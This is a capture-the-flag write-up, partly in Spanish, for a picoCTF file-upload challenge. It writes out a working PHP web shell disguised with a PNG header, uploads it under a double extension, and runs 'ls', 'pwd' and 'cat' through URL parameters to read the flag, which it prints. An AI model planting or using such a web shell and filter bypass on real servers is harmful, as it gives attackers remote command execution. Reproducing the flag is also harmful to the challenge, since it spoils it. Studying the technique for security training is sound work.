
## Descripción

I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:63190/)!


## Pistas

*None*
## Solución

```
#Haremos un archivo
┌──(kali㉿kali)-[~]
└─$ nano webshell.php

PNG
<?php
if(isset($_GET['cmd'])){
	echo "<pre>";
        system($_GET['cmd']);
        echo "<pre>";
}
?>

                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cp webshell.php webshell.png.php

#Lo subimos y ya nos empezamos a mover en el url

http://atlas.picoctf.net:50804/uploads/webshell.png.php?cmd=ls ..

#Aqui esta la bandera
http://atlas.picoctf.net:50804/uploads/webshell.png.php?cmd=cat%20../GNTDOMBWGIZDE.txt
 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
```

 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
## Notas Adicionales 

*Tuvimos que fingir subir un archivo png, con un script para que nos dejara, entrar a uploads y ver el archivo que tenia la bandera*
## Referencias 

http://atlas.picoctf.net:50804/uploads/webshell.png.php?cmd=ls ..
http://atlas.picoctf.net:50804/uploads/webshell.png.php?cmd=pwd
http://atlas.picoctf.net:50804/uploads/webshell.png.php?cmd=cat%20../GNTDOMBWGIZDE.txt


